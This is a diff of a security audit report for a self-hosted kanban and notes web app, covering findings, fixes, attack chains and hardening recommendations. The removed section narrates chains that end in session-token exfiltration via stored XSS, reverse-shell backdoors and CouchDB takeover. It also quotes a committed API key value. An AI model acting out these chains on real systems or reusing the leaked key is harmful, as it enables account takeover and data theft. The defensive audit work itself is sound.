-**Component:** `app/server.js:609`, `app/server.js:693`
-
-```js
-const fp = path.join(ATTACHMENTS_DIR, board, pageId, filename);
-res.sendFile(fp);  // no root option
-```
-
-`safeFilename` does not reject null bytes (`\x00`). On some OS/filesystem combinations a null byte truncates a path string, potentially serving a different file. Express's documentation strongly recommends always passing `root`.
-
-**Fix:**
-```js
-res.sendFile(path.basename(filename), { root: path.join(ATTACHMENTS_DIR, board, pageId) });
-```
-Add `&& !name.includes('\x00')` to `safeFilename`.
-
----
-
-### MED-04 — Rate Limiter Bypassed When Behind a Reverse Proxy (`req.ip` = proxy IP)
-
-**Severity:** Medium
-**Component:** `app/server.js:217`, `app/server.js:227`
-
-Without `app.set('trust proxy', 1)`, `req.ip` is always the proxy's IP — all users share a single rate-limit bucket, defeating the protection entirely.
-
-**Fix:** Set `app.set('trust proxy', 1)` when deployed behind exactly one trusted reverse proxy and document this requirement.
-
----
-
-### MED-05 — Session Token Is Process-Singleton; No Expiry
-
-**Severity:** Medium
-**Component:** `app/server.js:15`
-
-```js
-const SESSION_TOKEN = crypto.randomBytes(32).toString('hex');
-```
-
-One global token is generated at startup. It never expires — a leaked token is valid indefinitely until the server restarts. Any server restart (deployment, crash) invalidates all sessions simultaneously.
-
-**Fix:** Use signed, time-limited tokens (JWT with short expiry or PASETO) stored as `httpOnly` cookies, or persist a token secret in the environment rather than regenerating it at startup.
-
----
-
-### MED-06 — Zip Slip Risk in Notes Export (User-Controlled Filenames in Archive)
-
-**Severity:** Medium
-**Component:** `app/server.js:748`
-
-```js
-archive.file(path.join(aDir, f), { name: dir + 'attachments/' + f });
-```
-
-`dir` is built from `page.title` with only a narrow set of characters replaced. A title containing Unicode lookalikes of `/` or a value like `...` produces unexpected ZIP entry paths. If a filename starting with `../` were ever present on disk, it would produce a Zip Slip archive.
-
-**Fix:** Use `path.basename(f)` for archive entry names. Validate that no computed ZIP entry path contains `..`.
-
----
-
-### MED-07 — Backup Files Contain Full Plaintext Board State on Host Filesystem
-
-**Severity:** Medium
-**Component:** `app/server.js:763-780`, `docker-compose.yml` volume `./data`
-
-Full JSON exports (all cards, notes, descriptions) are written to `./data/json/` every 10 minutes. Default directory permissions on developer machines are often world-readable.
-
-**Fix:** Ensure `./data` is `chmod 700`. Consider encrypting backups at rest.
-
----
-
-### MED-08 — `logApiResponses` Setting Returned to Client; Enables Console Token Logging
-
-**Severity:** Medium
-**Component:** `app/server.js:258`, `app/public/settings.js:568-585`
-
-When the server returns `logApiResponses: true`, the frontend monkey-patches `window.fetch` to log all request/response bodies to the browser console — including the `x-auth-token` header on every API call.
-
-**Fix:** Remove `logApiResponses` from the `GET /api/settings` response entirely. Server-side logging behavior should not be controlled or reflected through the client.
-
----
-
-### MED-09 — Live Source Code Bind-Mounted Into the Running Container
-
-**Severity:** Medium
-**Component:** `docker-compose.yml:33-34`
-
-```yaml
-volumes:
-  - ./app/public:/app/public
-  - ./app/server.js:/app/server.js
-```
-
-Any process on the host with write access to `./app/server.js` immediately modifies the running application. This is a container escape-equivalent risk.
-
-**Fix:** Remove these bind-mounts from the production compose file. Keep them only in a `docker-compose.override.yml` for development.
-
----
-
-### MED-10 — `cors` Package Listed as Dependency but Never Used
-
-**Severity:** Medium (supply-chain surface + misleading)
-**Component:** `app/package.json:17`
-
-`cors` is in `dependencies` but never `require()`d. This creates confusion about the CORS policy and inflates the attack surface. Future developers may assume CORS is already configured.
-
-**Fix:** Remove it from `dependencies` or configure it explicitly with a strict `origin` allowlist.
-
----
-
-### LOW-01 — `safeEqual` Truncates Inputs at 128 Bytes
-
-**Severity:** Low
-**Component:** `app/server.js:158-164`
-
-```js
-const bufA = Buffer.alloc(128);
-Buffer.from(String(a || '')).copy(bufA, 0, 0, 128);
-```
-
-Two values that share the same first 128 bytes but differ beyond that will compare as equal. The current `SESSION_TOKEN` is 64 hex chars (safe), but any future longer token silently becomes vulnerable to prefix-collision authentication.
-
-**Fix:**
-```js
-function safeEqual(a, b) {
-  const sa = String(a || ''), sb = String(b || '');
-  if (sa.length !== sb.length) return false;
-  return crypto.timingSafeEqual(Buffer.from(sa), Buffer.from(sb));
+```nginx
+location / {
+    allow 1.2.3.4;    # your home/office IP
+    deny  all;
+    proxy_pass http://127.0.0.1:3000;
+    # ...
 }
 ```
 
----
-
-### LOW-02 — Card/Column IDs Use `Math.random()` (Not Cryptographically Unpredictable)
-
-**Severity:** Low
-**Component:** `app/public/state.js:175`, `app/server.js:510`, `app/server.js:529`
-
-```js
-const uid = () => 'id-' + Math.random().toString(36).slice(2, 9);
-```
-
-IDs used in attachment paths and linked-card references are predictable. An attacker who can guess a card ID can probe attachment endpoints.
-
-**Fix:** `crypto.randomBytes(6).toString('hex')` on the server; `crypto.getRandomValues()` in the browser.
+Combined with 2FA, this provides layered protection even if credentials are compromised.
 
 ---
 
-### LOW-03 — Fauxton Link in Settings Reveals CouchDB Port to All Users
+## 6. What Is Already Well-Protected
 
-**Severity:** Low
-**Component:** `app/public/settings.js:177-178`
+The following is a summary of security controls already in place, for context:
 
-The Settings dialog directly links to `http://<hostname>:5984/_utils`, advertising the internal CouchDB address and port. If CouchDB should not be user-accessible (see HIGH-06), remove this link.
-
----
-
-### LOW-04 — PDF Viewer Uses Unsandboxed `<iframe>`
-
-**Severity:** Low
-**Component:** `app/public/notes.js:910-912`
-
-PDFs are displayed in an `<iframe>` with no `sandbox` attribute. A malicious PDF exploiting a browser PDF-renderer vulnerability would run with full same-origin privileges.
-
-**Fix:** `iframe.sandbox = "allow-scripts allow-same-origin"` (minimum needed for PDF rendering).
-
----
-
-### LOW-05 — `?login=` Password Persists in Browser Extension Memory
-
-**Severity:** Low
-**Component:** `app/public/settings.js:68-72`
-
-Supplement to HIGH-05: even after `history.replaceState`, browser extensions monitoring the `navigation` API or `document.location` may record the password before the replacement executes.
-
----
-
-### LOW-06 — API Key Is Short and Low-Entropy
-
-**Severity:** Low
-**Component:** `.env` line `API_KEY=4T398-HJK45-09KL9-ASED3`
-
-23 characters in a predictable dash-grouped format. The server itself logs a warning about this at startup, yet the committed `.env` uses this value.
-
-**Fix:** `openssl rand -hex 32` → 64-character cryptographically random key.
-
----
-
-### LOW-07 — Board Name Collision in Backup Filenames
-
-**Severity:** Low
-**Component:** `app/server.js:772`
-
-A board name with a leading/trailing hyphen (from an import bug) could produce unexpected filenames like `kanban--board.json`, potentially creating ambiguity or overwrite issues.
-
----
-
-## 3. Attack Chains
-
-### Chain A — Git Repo → Stored XSS → Full Session Hijack
-
-**No authentication required to begin.**
-
-1. **CRIT-01** — Clone the repo (or check history) → extract `API_KEY=4T398-HJK45-09KL9-ASED3`
-2. **HIGH-01** — Call `GET /api/boards` with `x-api-key: 4T398-...` → enumerate all boards
-3. **CRIT-02 + HIGH-02** — `POST /api/<board>/import` with malicious `description` containing an `onerror` XSS payload that POSTs `sessionStorage.getItem('kanban-auth')` to an attacker-controlled server
-4. **CRIT-02** — Next legitimate user opens the board → XSS fires
-5. **HIGH-04** — Token extracted from `sessionStorage` and exfiltrated
-6. Attacker holds a valid long-lived session token → full read/write/delete access to all boards indefinitely
-
-**Severity: Critical end-to-end. Requires only public repo access.**
-
----
-
-### Chain B — Authenticated Upload → Same-Origin HTML Execution → Session Hijack
-
-**Requires one authenticated session (e.g., the attacker has the password).**
-
-1. **HIGH-03** — Upload `steal.html` with JS payload to any note attachment endpoint
-2. File served from same origin at `/api/<board>/notes/attachments/<pageId>/steal.html`
-3. Attacker embeds the URL as a Markdown link in a note description (or sends directly)
-4. Victim clicks the link → browser executes the HTML on the same origin
-5. **HIGH-04** — Script reads `sessionStorage` token → exfiltrated
-6. Attacker impersonates the victim with a long-lived token
-
----
-
-### Chain C — Log Access → Credential Extraction → CouchDB Takeover
-
-**Requires access to Docker container logs or browser DevTools.**
-
-1. **CRIT-03** — `LOG_API_RESPONSES=true`; container stdout contains plaintext password and tokens
-2. Attacker reads `POST /api/auth` log entries → recovers `APP_PASSWORD`
-3. **HIGH-06** — CouchDB port 5984 is open; attacker authenticates with `COUCHDB_PASSWORD` (same value, committed in CRIT-01) directly to Fauxton
-4. Attacker reads, modifies, or drops all databases — bypassing all application-layer controls
-
----
-
-### Chain D — Host Filesystem Write → Server Code Injection → RCE
-
-**Requires host write access (compromised dev machine, CI/CD pipeline, supply chain).**
-
-1. **MED-09** — `./app/server.js` is bind-mounted into the running container
-2. Attacker writes a backdoor (reverse shell, data exfiltration) to `./app/server.js` on the host
-3. The modified code is live immediately on the next HTTP request — no container restart required
-4. **HIGH-09** — Node process runs as root inside the container → no privilege barrier to the mounted `./data` volume or potential container escape
-
----
-
-## 4. Secure Design Recommendations
-
-### Immediate (before any production exposure)
-
-| # | Action |
-|---|--------|
-| 1 | Purge `.env` from git history (`git filter-repo`) and rotate all credentials |
-| 2 | Set `LOG_API_RESPONSES=false` in production; redact sensitive fields in the middleware |
-| 3 | Restrict CouchDB: `"127.0.0.1:5984:5984"` in compose; remove mapping in production |
-| 4 | Wrap every `marked.parse()` → `innerHTML` with `DOMPurify.sanitize()` |
-| 5 | Add multer `fileFilter` blocking `.html`, `.htm`, `.svg`, `.js`, `.php`, `.sh` |
-
-### Short-term (within one sprint)
-
-| # | Action |
-|---|--------|
-| 6 | Replace `sessionStorage` token with `httpOnly; Secure; SameSite=Strict` cookie |
-| 7 | Add `helmet` middleware for all security headers (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy) |
-| 8 | Remove live source code bind-mounts from production compose; move to `docker-compose.override.yml` |
-| 9 | Add a non-root `USER` in `Dockerfile` |
-| 10 | Fix `res.sendFile` to use the `root` option; add null-byte check to `safeFilename` |
-| 11 | Remove the `?login=` URL feature |
-| 12 | Return only a masked API key from `GET /api/settings`; remove `logApiResponses` from the response |
-| 13 | Set `app.set('trust proxy', 1)` when deployed behind a reverse proxy |
-| 14 | Add `Content-Disposition: attachment` header on file-serve responses |
-
-### Medium-term (architecture)
-
-| # | Action |
-|---|--------|
-| 15 | Add `ajv` JSON Schema validation on all board/notes write endpoints |
-| 16 | Add `express-rate-limit` on import, upload, and all board-write routes |
-| 17 | Replace `Math.random()` IDs with `crypto.randomBytes` (server) / `crypto.getRandomValues` (browser) |
-| 18 | Fix `safeEqual` to compare lengths before timing-safe comparison |
-| 19 | Switch to signed, time-limited session tokens (JWT/PASETO) with token expiry |
-| 20 | Add a `.env.example` with placeholder values; ensure real `.env` is never committed again |
-| 21 | Add `sandbox` attribute to all dynamically created `<iframe>` elements |
-| 22 | Remove the unused `cors` package or configure it explicitly with a strict `origin` allowlist |
+| Control | Status |
+|---------|--------|
+| Password hashing comparison | Timing-safe (`crypto.timingSafeEqual`) |
+| Session tokens | HMAC-SHA256 signed, 7-day expiry, `httpOnly; Secure; SameSite=Strict` cookie |
+| Login brute force | 10 attempts per 15-min window; lockout after 5 consecutive failures |
+| Write rate limiting | 200 write / 30 upload requests per 15-min window per IP |
+| 2FA | Email OTP for external IPs when configured (but see MED-01/02) |
+| XSS — user content | DOMPurify wraps all `marked.parse()` → `innerHTML` paths |
+| XSS — link injection | `safeLink()` enforces `http:`/`https:` protocol only |
+| Security headers | `helmet` sets CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy |
+| File upload | Extension blocklist (exe, php, js, sh, etc.); 50 MB limit; `Content-Disposition: attachment` |
+| Path traversal | `safeFilename`, `safePageId`, `safeCardId` regex validation; `res.sendFile` with `root` option |
+| JSON schema validation | AJV validates all board, notes, card, calendar event writes |
+| Prototype pollution | `sanitize()` strips `__proto__`, `constructor`, `prototype` keys before CouchDB writes |
+| Injection | No SQL; CouchDB accessed via `nano` (no raw query strings); no shell execution |
+| Docker | Non-root `USER node`; `chmod 700 /app/data`; no source code bind mounts in production |
+| CouchDB | Bound to `127.0.0.1` (not public); internal Docker network only for inter-container comms |
+| Credentials in logs | `password`, `token`, `apiKey` redacted in API logging middleware |
+| API key exposure | Only boolean `apiKeyConfigured` returned by `GET /api/settings` |
